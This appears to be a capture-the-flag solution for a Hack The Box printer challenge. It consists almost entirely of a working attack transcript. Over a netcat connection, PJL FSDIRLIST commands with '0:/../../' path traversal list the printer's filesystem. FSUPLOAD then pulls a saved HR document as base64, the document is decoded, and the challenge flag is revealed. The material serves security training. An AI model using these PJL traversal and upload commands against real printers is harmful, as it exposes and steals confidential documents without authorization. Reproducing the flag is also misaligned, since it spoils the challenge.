'''
nc 94.237.54.75 35090
@PJL FSDIRLIST NAME="0:/../../" ENTRY=1 COUNT=1024
@PJL FSDIRLIST NAME="0:/../../" ENTRY=1
. TYPE=DIR
.. TYPE=DIR
PJL TYPE=DIR
PostScript TYPE=DIR
saveDevice TYPE=DIR
webServer TYPE=DIR

@PJL FSDIRLIST NAME="0:/../../saveDevice/SavedJobs/InProgress" ENTRY=1 COUNT=1024
@PJL FSDIRLIST NAME="0:/../../saveDevice/SavedJobs/InProgress" ENTRY=1
. TYPE=DIR
.. TYPE=DIR
HR_Policies.pdf TYPE=FILE SIZE=41893

@PJL FSUPLOAD FORMAT:BINARY NAME="0:/../../saveDevice/SavedJobs/InProgress/HR_Policies.pdf" TYPE=FILE SIZE=41893
@PJL FSUPLOAD FORMAT:BINARY NAME="0:/../../saveDevice/SavedJobs/InProgress/HR_Policies.pdf" OFFSET=0 SIZE=41893
JVBERi0xLjQKJdPr6eEKMSAwIG9iago8PC9UaXRsZSAoQm9vayByZXBvcnQpCi9Qcm9kdWNlciAo
U2tpYS9QREYgbTk0IEdvb2dsZSBEb2NzIFJlbmRlcmVyKT4+CmVuZG9iagozIDAgb2JqCjw8L2Nh
IDEKL0JNIC9Ob3JtYWw+PgplbmRvYmoKNiAwIG9iago8PC9UeXBlIC9YT2JqZWN0Ci9TdWJ0eXBl
......

copy the base64 text to output.txt
base64 -d output.txt > flag.pdf

HTB{tr4v3rs3_m4n4g3ment_d3240!}
'''
